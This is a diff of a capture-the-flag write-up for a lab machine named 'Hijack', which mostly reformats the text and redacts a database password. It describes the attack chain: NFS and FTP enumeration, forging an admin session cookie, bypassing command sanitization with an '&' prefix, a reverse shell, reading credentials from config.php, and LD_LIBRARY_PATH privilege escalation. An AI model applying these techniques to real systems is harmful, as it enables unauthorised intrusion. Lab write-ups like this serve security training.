@@ -4,7 +4,7 @@
 # Points: 60
 # Vulnerabilities: Cookie hijacking, RCE sanitization bypass, Path hijack 
 
-# Reconnaisance:
+# Phase 1 - Reconnaisance:
 lets carry out a classic nmap scan
 ```bash
 nmap -sV -sC <target ipt>
@@ -13,51 +13,19 @@ nmap -sV -sC <target ipt>
 
 nmap scan:
 
-PORT     STATE SERVICE VERSION
+`PORT     STATE SERVICE VERSION`
 
-21/tcp   open  ftp     vsftpd 3.0.3
+`21/tcp   open  ftp     vsftpd 3.0.3`
 
-22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 94:ee:e5:23:de:79:6a:8d:63:f0:48:b8:62:d9:d7:ab (RSA)
-|   256 42:e9:55:1b:d3:f2:04:b6:43:b2:56:a3:23:46:72:c7 (ECDSA)
-|_  256 27:46:f6:54:44:98:43:2a:f0:59:ba:e3:b6:73:d3:90 (ED25519)
+`22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)`
 
-80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-| http-cookie-flags: 
-|   /: 
-|     PHPSESSID: 
-|_      httponly flag not set
-|_http-title: Home
+`80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))`
 
-111/tcp  open  rpcbind 2-4 (RPC #100000)
-| rpcinfo: 
-|   program version    port/proto  service
-|   100000  2,3,4        111/tcp   rpcbind
-|   100000  2,3,4        111/udp   rpcbind
-|   100000  3,4          111/tcp6  rpcbind
-|   100000  3,4          111/udp6  rpcbind
-|   100003  2,3,4       2049/tcp   nfs
-|   100003  2,3,4       2049/tcp6  nfs
-|   100003  2,3,4       2049/udp   nfs
-|   100003  2,3,4       2049/udp6  nfs
-|   100005  1,2,3      33150/tcp   mountd
-|   100005  1,2,3      56635/udp   mountd
-|   100005  1,2,3      57942/tcp6  mountd
-|   100005  1,2,3      59660/udp6  mountd
-|   100021  1,3,4      33871/udp6  nlockmgr
-|   100021  1,3,4      43261/tcp6  nlockmgr
-|   100021  1,3,4      45482/tcp   nlockmgr
-|   100021  1,3,4      54713/udp   nlockmgr
-|   100227  2,3         2049/tcp   nfs_acl
-|   100227  2,3         2049/tcp6  nfs_acl
-|   100227  2,3         2049/udp   nfs_acl
-|_  100227  2,3         2049/udp6  nfs_acl
+`111/tcp  open  rpcbind 2-4 (RPC #100000)`
 
-2049/tcp open  nfs     2-4 (RPC #100003)
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+`2049/tcp open  nfs     2-4 (RPC #100003)`
 
+`Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel`
 
 thats good! lets mount the nfs share at /mnt/nfsshare
 ```bash
@@ -91,15 +59,10 @@ turns out that we cannot get the ftp files due to permission issues so we make a
 ```bash
 get .from_admin.txt /dev/stdout
 ```
-local: /dev/stdout remote: .from_admin.txt
-229 Entering Extended Passive Mode (|||10723|)
-150 Opening BINARY mode data connection for .from_admin.txt (368 bytes).
-To all employees, this is "admin" speaking,
-i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.
+`To all employees, this is "admin" speaking,
+i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.`
 
-NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.
-226 Transfer complete.
-368 bytes received in 00:00 (1.50 KiB/s)
+`NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.`
 
 in the similar way, we manage to get the passwords_list.txt
 
@@ -151,6 +114,7 @@ print(f"\nGenerated {len(cookies)} cookies. Saved to 'cookies_output.txt'")
                                                                        
 we get a suspicious response length at the php session cookie YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU%3D
 in order to edit the session cookie, right click at the /administrator.php page and click on Inspect
+
 after that go to Storage and doule click on the 'value' of the Cookie session. paste this cookie instead YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU%3D
 now press enter and just refresh the page
 
@@ -158,7 +122,9 @@ we get administration access. now we should be able to exectute commands in the 
 we can bypass the sanitization by putting a '&' sign before our commands,
 
 for eg:
+
 & whoami 
+
 will give us the output www-data
 
 using this information, we input a bash reverse shell into the input field
@@ -169,13 +135,14 @@ using this information, we input a bash reverse shell into the input field
 
 we get a shell as www-data!
 by running linpeas.sh we get some credentials of the user rick
-
-www-data@Hijack:/tmp$ cat /var/www/html/config.php
+``bash
 cat /var/www/html/config.php
+``
+```bash
 <?php
 $servername = "localhost";
 $username = "rick";
-$password = "N3v3rG0nn4G1v3Y0uUp";
+$password = "< REDACTED >";
 $dbname = "hijack";
 
 // Create connection
@@ -186,11 +153,12 @@ if ($mysqli->connect_error) {
   die("Connection failed: " . $mysqli->connect_error);
 }
 ?>
+```
 
 by entering rick's password, we get a shell as rick. on carrying out sudo -l we find out that the user rick can run some commands as sudo
 
-User rick may run the following commands on Hijack:
-    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
+`User rick may run the following commands on Hijack:`
+    `(root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2`
 
 using linpeas we found a 95% attack vector which was the env_keep+=LD_LIBRARY_PATH
 we are going to hijack the path by created am exploit script with some path hijacking
